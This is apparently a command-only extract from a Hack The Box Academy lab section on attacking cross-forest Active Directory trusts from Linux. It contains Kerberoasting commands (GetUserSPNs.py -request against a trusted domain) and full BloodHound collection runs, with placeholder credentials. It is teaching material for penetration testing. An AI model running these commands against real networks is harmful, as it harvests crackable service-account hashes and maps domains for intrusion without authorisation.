# Section 31: Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1509
- Code/command blocks: 7

> Terminal output is omitted; only commands & scripts are captured.

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL {{DOMAIN_UPPER}}/wley
```

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL {{DOMAIN_UPPER}}/wley  
```

```bash
cat /etc/resolv.conf 
```

```bash
bloodhound-python -d {{DOMAIN_UPPER}} -dc ACADEMY-EA-DC01 -c All -u {{USERNAME}} -p {{PASSWORD}}
```

```bash
zip -r ilfreight_bh.zip *.json
```

```bash
cat /etc/resolv.conf 
```

```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}}
```

